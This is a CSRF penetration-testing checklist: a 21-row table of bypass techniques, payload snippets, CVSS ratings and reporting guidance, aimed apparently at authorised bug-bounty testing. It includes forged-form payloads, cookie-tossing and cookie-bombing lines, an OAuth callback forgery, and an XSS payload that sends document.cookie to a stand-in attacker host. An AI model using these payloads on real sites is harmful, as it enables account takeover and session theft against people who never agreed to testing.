# CSRF — Checklist

Expert per-attack **test-case matrix** for CSRF — in testing order, impact-first. All columns preserved (where to inject, steps, expected, payload, impact, severity, CVSS, tools, refs).

*21 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| CSRF-001 | List state-changing actions + lab setup | Recon &amp; Lab | Every state-changing action, ranked by impact | 1. List state-changing actions ranked by impact (auth &gt; financial/admin &gt; data &gt; trivial).<br>2. Two browser profiles (victim logged-in + attacker), DEFAULT settings; a cross-site host for the PoC.<br>3. Record each action's request: method, URL, params, content-type, token presence. | A ranked action list with each request captured. | <code>actions: change-email (POST, token) ; delete (GET) ; add-admin (POST)</code> | The highest-impact action (ATO/admin) is the one worth chaining - rank first. | Info | 0.0 (N/A) | Burp Suite Pro | CWE-352; OWASP: CSRF Prevention Cheat Sheet; WSTG-SESS-05 |
| CSRF-002 | Baseline — the SameSite gate (decides if CSRF is possible) | Baseline (the gate) | The session cookie + the target request | 1. Q1: is auth a COOKIE the browser auto-sends? (Bearer/localStorage = NOT CSRF, stop.)<br>2. Q2: read the session cookie SameSite (DevTools): None / Lax / Strict / absent(=Lax).<br>3. Q3: is there an anti-CSRF token, and is it validated/session-bound? Q4: Referer/Origin checked? Q5: JSON content-type/custom header required?<br>4. Verdict: possible (None / Lax+GET-sink / token bypassable) vs N/A (Lax+POST+enforced token / Bearer). | A verdict on whether CSRF is possible and which bypass class is needed. | <code>DevTools -&gt; Cookies -&gt; SameSite=None ; token not session-bound -&gt; CSRF possible</code> | SameSite is the gate - it decides whether any template can work at all. | Info | 0.0 (N/A) | Burp, DevTools | CWE-352; CWE-1275; PortSwigger Web Security Academy: CSRF + Bypassing SameSite restrictions |
| CSRF-003 | Anti-CSRF token bypass | Token Bypass | The anti-CSRF token in the request | 1. Remove the token entirely / send empty -&gt; accepted?<br>2. Use YOUR OWN session's token in the victim request -&gt; accepted? (= not session-bound, the most common real bug).<br>3. Correct length wrong value (presence-only); drop token on GET/multipart/text-plain; method override _method=PUT. | The action succeeds without a valid, session-bound token. | <code>remove csrf_token ; use attacker's own token in victim request ; _method=PUT</code> | Defeats the anti-CSRF control -&gt; forgeable request. Enables the ATO chain. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | Burp Repeater, XSRFProbe | CWE-352; PortSwigger Web Security Academy: CSRF + Bypassing SameSite restrictions |
| CSRF-004 | Valid-token CSRF via token leak/theft | Token Bypass | Anywhere the token is exposed cross-origin | 1. Leak the token: via Referer (token in URL), a reflected page, permissive CORS (read /api/csrf cross-origin), XSS, or an open redirect carrying it.<br>2. Defeat double-submit: if you can SET the cookie (subdomain/injection), set cookie=body=attacker value -&gt; both match.<br>3. Use the leaked/matched token in a forged request. | A leaked or attacker-set token makes the forged request valid. | <code>read /api/csrf via permissive CORS ; double-submit: set cookie=body=known value</code> | Valid-token CSRF even with strong tokens - High. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | Burp, CORS/XSS kits | CWE-352; HackTricks: CSRF |
| CSRF-005 | Classic CSRF — SameSite=None POST | SameSite Bypass | Session cookie SameSite=None | 1. Auto-submit POST form to the sensitive endpoint with all required params.<br>2. Cookie is sent cross-site (None) -&gt; action executes.<br>3. Verify in a default browser cross-site. | The cross-site POST executes the sensitive action. | <code>&lt;form action=$URL/account/email method=POST&gt;&lt;input name=email value=$ATTACKER&gt;&lt;/form&gt; auto-submit</code> | Classic CSRF -&gt; sensitive state change / ATO. High. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | poc/csrf_poc_generator.py, Burp | CWE-352; PortSwigger Web Security Academy: CSRF + Bypassing SameSite restrictions |
| CSRF-006 | Lax GET-nav state change | SameSite Bypass | Lax/absent cookie + a GET-reachable sensitive action | 1. Lax SENDS the cookie on top-level GET navigation: window.location=$URL/account/email/change?email=$ATTACKER.<br>2. Look for sibling GET routes (/delete, /confirm, /change?).<br>3. NOTE: &lt;img&gt;/&lt;iframe&gt;/fetch are NOT top-level nav -&gt; Lax won't send; use navigation. | A top-level GET navigation performs the state change under Lax. | <code>window.location='$URL/account/delete?confirm=1' ; sibling GET routes</code> | CSRF under the Lax default via GET-accepted actions. High. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | poc/csrf_poc_generator.py | CWE-352; PortSwigger Web Security Academy: CSRF + Bypassing SameSite restrictions |
| CSRF-007 | Lax + POST two-minute window | SameSite Bypass | Chromium Lax default + a freshly-set session cookie | 1. A cookie &lt; 120s old is sent on a cross-site TOP-LEVEL POST (Lax+POST window).<br>2. Force the victim through login (or a flow that re-sets the cookie), then auto-POST within ~2 min.<br>3. Verify in default Chrome. | A cross-site top-level POST succeeds within the fresh-cookie window. | <code>victim just logged in -&gt; auto top-level POST form within ~2 min</code> | Revives classic POST CSRF under the Lax default - High. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | poc/csrf_poc_generator.py | CWE-352; PortSwigger Web Security Academy: CSRF + Bypassing SameSite restrictions |
| CSRF-008 | SameSite Strict bypass via client-side redirect / SPA gadget | SameSite Bypass | SameSite=Strict + an on-site client-side redirect / SPA router | 1. The FINAL request must be SAME-SITE. Use an on-site JS open-redirect (target.com/go?to=/account/delete) or a SPA route (#/account/delete) so the target's OWN code issues the request.<br>2. Strict cookies ride a same-site client-side navigation.<br>3. Find the gadget: any ?to=/?url=/?next= JS follows, or a #/route the SPA acts on. | The target's own JS re-issues the request same-site, carrying the Strict cookie. | <code>window.location='$URL/go?to=/account/delete?confirm=1' ; $URL/#/account/delete?confirm=1</code> | CSRF under SameSite=Strict via an on-site redirect gadget - High. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | Burp | CWE-352; PortSwigger Web Security Academy: CSRF + Bypassing SameSite restrictions |
| CSRF-009 | Same-site position via subdomain XSS / takeover (defeats SameSite=Strict) | SameSite Bypass | SameSite=Strict/Lax session cookie + any attacker-controllable subdomain (XSS on a sub, or a dangling-CNAME takeover) | 1. SameSite is scoped to SITE (eTLD+1), not origin: a request from sub.target.com is SAME-SITE to target.com, so the cookie flows even under Strict.<br>2. Get a same-site foothold: stored/reflected XSS on ANY subdomain (app./dev./staging.), OR take over a dangling-CNAME subdomain (Recon/SubdomainTakeover kit) and host the PoC there.<br>3. Issue the state-changing request FROM that subdomain origin -&gt; the Strict/Lax cookie is sent -&gt; CSRF fires -&gt; chain to change-email/pw -&gt; ATO. | A request from a controlled &#42;.target.com origin carries the Strict/Lax cookie and performs the sensitive action. | <code>XSS on app.target.com -&gt; fetch('https://target.com/account/email',{method:'POST',credentials:'include',body:...}) ; or host PoC on a taken-over sub.target.com</code> | Same-site position defeats even SameSite=Strict -&gt; CSRF -&gt; ATO (chains subdomain XSS/takeover). High. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | XSS kit, SubdomainTakeover kit, Burp | CWE-352; CWE-1275; PortSwigger Web Security Academy: Bypassing SameSite restrictions |
| CSRF-010 | 307/308 method-preserving redirect | SameSite Bypass | A target redirector answering 307/308 | 1. Bounce a cross-site simple-POST through a target 307/308 redirector -&gt; the browser REPLAYS method+body to the endpoint (302/303 downgrade to GET and won't help).<br>2. Reach an endpoint/method a form can't craft.<br>3. If the 307 lands SAME-SITE, the Strict/Lax cookie survives. | A 307/308 replays the POST body+method to the real endpoint. | <code>cross-site POST -&gt; target ?url=... (307) -&gt; method+body replayed to /api/endpoint</code> | Reaches non-form-craftable endpoints and preserves the cookie - High. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | Burp | CWE-352; PortSwigger Web Security Academy: CSRF + Bypassing SameSite restrictions |
| CSRF-011 | Referer / Origin check bypass | Header Check Bypass | Servers validating Referer/Origin | 1. Strip Referer: &lt;meta name=referrer content=no-referrer&gt;.<br>2. Null Origin: sandboxed iframe / data: document.<br>3. Weak regex: target.com.evil.com (as your subdomain), evil.com/target.com (path), evil.com?x=target.com. | The forged request passes the Referer/Origin check. | <code>&lt;meta name=referrer content=no-referrer&gt; ; Origin: null via sandboxed iframe ; target.com.evil.com</code> | Defeats Referer/Origin-only CSRF defenses - High. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | Burp | CWE-352; HackTricks: CSRF |
| CSRF-012 | Content-Type / JSON CSRF (text/plain trick) | Content-Type Bypass | JSON APIs guarded by content-type | 1. First: does the JSON API ALSO accept urlencoded? (very common) - plain form works.<br>2. text/plain trick: &lt;form enctype=text/plain&gt;&lt;input name='{"email":"$ATTACKER","x":"' value='"}'&gt; -&gt; body {"email":"$ATTACKER","x":"="}.<br>3. Multipart variant. | A form-crafted request delivers a valid JSON body the API accepts. | <code>enctype=text/plain form building {"email":"$ATTACKER","ignore":"="} ; or urlencoded accepted</code> | CSRF on a 'JSON-only' API via content-type confusion - High. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | poc/csrf_poc_generator.py | CWE-352; PortSwigger Web Security Academy: CSRF + Bypassing SameSite restrictions |
| CSRF-013 | Clickjacking-assisted CSRF | Clickjacking-Assisted | Framable settings page (no X-Frame-Options / frame-ancestors) + cookie reaches frame | 1. Check framability: no X-Frame-Options AND no CSP frame-ancestors.<br>2. Frame the REAL page (carries the victim's REAL token); overlay bait to steal the click over the submit button.<br>3. Requires the cookie to reach the frame (SameSite=None / same-site). | The victim's click on bait submits the real, token-bearing form. | <code>transparent iframe of $URL/account/settings + bait over the submit button</code> | State change with the real token when it can't be scripted - Medium/High. | Medium | 6.9 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:N) | Burp, curl -I (framability) | CWE-352; CWE-1021; HackTricks: CSRF |
| CSRF-014 | Cookie tossing / cookie sandwich (subdomain cookie injection) | Cookie Injection | Cookie scope across subdomains; a controlled/XSS'd sibling subdomain | 1. From a sibling/less-trusted subdomain, set a cookie scoped to the parent domain (name/path collision)<br>2. 'Sandwich' the target cookie so the server reads the attacker's value<br>3. Overwrite the CSRF-token cookie or fixate the session<br>4. Confirm request forgery / session fixation | __Host- cookies, host-only scoping, cookie integrity; no implicit subdomain cookie trust | <code>Set-Cookie: sessionid=attacker; Domain=.target.com; Path=/   (from sub.target.com)</code> | Cookie tossing -&gt; overwrite/fixate victim cookies -&gt; CSRF-token bypass / session fixation | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp, browser | CWE-384; CWE-565; PortSwigger cookie security; 'Cookie Tossing/Sandwich' research (filedescriptor) |
| CSRF-015 | Cookie bombing / jar overflow (control bypass + client DoS) | Cookie Injection | Per-domain cookie jar size/count limits | 1. Set many/large cookies for the target domain from a controlled subdomain or via injection<br>2. Overflow the cookie jar so the browser drops/rejects legitimate cookies<br>3. Force logout, break the CSRF-token cookie, or bypass a cookie-based control<br>4. Confirm the security cookie is evicted | Cookie count/size bounded; security cookies protected (__Host-, integrity checks) | <code>for i in 1..200: Set-Cookie: junk_$i=AAAA...(4KB); Domain=.target.com</code> | Cookie bombing -&gt; evict security/CSRF cookies -&gt; control bypass or client-side DoS | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp, browser | CWE-770; CWE-384; PortSwigger cookie jar limits; disclosed cookie-bomb writeups |
| CSRF-016 | CSRF -&gt; account takeover | Impact — ATO | Change-email / change-password / disable-2FA / add-key endpoints | 1. CSRF change email/recovery -&gt; reset -&gt; log in as victim.<br>2. CSRF change password (no old pw) / disable-2FA / add passkey/API/SSH key.<br>3. Demonstrate end-to-end on your own two accounts, in a default browser cross-site. | The CSRF changes a recovery/credential factor, yielding takeover. | <code>CSRF POST /account/email {email:$ATTACKER} -&gt; reset -&gt; inside victim</code> | Full account takeover via CSRF - the headline impact. High/Critical. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | poc/csrf_poc_generator.py | CWE-352; CWE-640; PortSwigger Web Security Academy: CSRF + Bypassing SameSite restrictions |
| CSRF-017 | OAuth/SSO state-CSRF -&gt; account-linking takeover | Impact - ATO | OAuth/SSO callback (/oauth/callback, connect-integration) with missing/unvalidated state | 1. The OAuth &#96;state&#96; param IS the anti-CSRF token of OAuth. Test: is it present, unpredictable, and validated on the callback?<br>2. Start the flow with YOUR identity-provider account; capture the callback URL (with your code).<br>3. CSRF the victim into completing YOUR callback -&gt; the victim's app account LINKS to your IdP identity -&gt; click 'Login with Google' -&gt; you are inside the victim's account.<br>4. Also test CSRF on 'connect/disconnect integration' (no state) to attach an attacker identity. | A missing/unchecked state links your IdP identity to the victim's account -&gt; you sign in as them. | <code>&lt;img src="$URL/oauth/callback?code=ATTACKER_CODE&amp;state="&gt; ; connect-integration POST with no state</code> | OAuth account-linking takeover -&gt; sign in as the victim; frequently un-duped. High. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | Burp, OAuth kit | CWE-352; CWE-287; PortSwigger Web Security Academy: OAuth 2.0 / CSRF |
| CSRF-018 | Login / GraphQL / CORS-credentialed CSRF variants | Impact — Variants | Login form, GraphQL endpoint, CORS-credentialed endpoints | 1. Login CSRF: silently log the victim into the ATTACKER's account (demonstrate concrete harm; Low-Medium alone).<br>2. GraphQL CSRF: a GET query or an application/x-www-form-urlencoded mutation reachable -&gt; CSRF a state-changing mutation.<br>3. CORS-credentialed CSRF: ACAO reflects the attacker origin + ACAC:true -&gt; fetch(credentials:include) sends custom-header/JSON writes AND reads the response (defeats the custom-header defense; cross-ref CORS kit). | A login/GraphQL/CORS variant produces a sensitive change (or captures the victim's data). | <code>GraphQL GET mutation ; fetch('$URL/api',{method:'POST',credentials:'include',headers:{'X-Requested-With':'XHR'}})</code> | Login-CSRF harm / GraphQL mutation / CORS-cred write+read (defeats custom-header defense) - Low to High by variant. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | Burp, CORS/GraphQL kits | CWE-352; HackTricks: CSRF; PortSwigger Web Security Academy: CSRF |
| CSRF-019 | CSRF-delivered self-XSS -&gt; stored/effective XSS -&gt; ATO | Impact - Chain | A self-XSS field (executes only in your own account) + a CSRF-able 'update that field' action | 1. Self-XSS alone is 'won't fix' (an attacker can't make a victim paste a payload into their OWN field). CSRF is the delivery.<br>2. Confirm CSRF on the 'update the vulnerable field' action (apply the SameSite gate, CSRF-002).<br>3. CSRF the victim into SAVING the XSS payload into THEIR OWN field -&gt; it executes in THEIR session -&gt; real stored XSS -&gt; steal session / ATO (cross-ref XSS kit). | The CSRF writes the XSS payload to the victim's own field; the payload then executes in the victim's session. | <code>CSRF POST /profile {bio:"&lt;script&gt;fetch('$ATTACKER/c?'+document.cookie)&lt;/script&gt;"} -&gt; fires in victim session</code> | Rescues a 'won't fix' self-XSS into stored XSS -&gt; ATO (two lows -&gt; one High). High. | High | 8.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N) | XSS kit, poc/csrf_poc_generator.py | CWE-352; CWE-79; PortSwigger Web Security Academy: CSRF (self-XSS delivery) |
| CSRF-020 | False-positive filter / auto-reject | Validation &amp; Reporting | Before reporting any candidate | 1. REJECT: Lax+POST with an enforced token; Bearer/localStorage auth (not CSRF); 'no token' with no working PoC; logout/trivial actions; self-CSRF; Repeater-only 'it worked' (same-site, meaningless for CSRF).<br>2. REQUIRE: it FIRED in a real DEFAULT-settings browser, CROSS-SITE, and changed something sensitive.<br>3. Record the cookie's SameSite value. | Only PoCs that fire in a default browser cross-site on a sensitive action survive. | <code>Repeater-only = meaningless ; Bearer-auth = not CSRF ; SameSite-disabled test = invalid</code> | Protects credibility; CSRF is dense with Repeater-only / Lax-blocked false positives. | Info | 0.0 (N/A) | default Chrome | CWE-352; PortSwigger Web Security Academy: CSRF + Bypassing SameSite restrictions |
| CSRF-021 | Client-facing impact &amp; SAFE PoC package | Validation &amp; Reporting | Confirmed finding, pre-submission | 1. Title names impact + why it works ('ATO via CSRF - session cookie SameSite=None, no token'); lead with the ATO.<br>2. Provide the PoC HTML, confirmation it fired in default Chrome cross-site, the cookie's SameSite value, and screenshots.<br>3. Set CVSS 3.1 (UI:R) + CWE-352 (+ outcome CWE, +1275 for weak SameSite). Remediation: session-bound anti-CSRF tokens, SameSite=Lax/Strict, verify Origin, require re-auth for sensitive changes.<br>4. Own two accounts, reversible; de-dupe to one root cause. | A reproducible, correctly-rated, browser-confirmed PoC with clear remediation. | <code>PoC: PoC HTML + default-browser confirmation + SameSite value + CVSS(UI:R) + CWE-352 + remediation.</code> | Converts the forged request into a defensible High report at the ATO severity. | Info | 0.0 (N/A) | CVSS calculator, CSRF_REPORT_TEMPLATE.md | CWE-352; CWE-1275; FIRST CVSS v3.1; OWASP: CSRF Prevention Cheat Sheet; WSTG-SESS-05  &#124;  TOP REFERENCES: PortSwigger Academy CSRF + 'Bypassing SameSite'; OWASP CSRF Prevention Cheat Sheet; Chromium SameSite docs; RFC 6265bis |
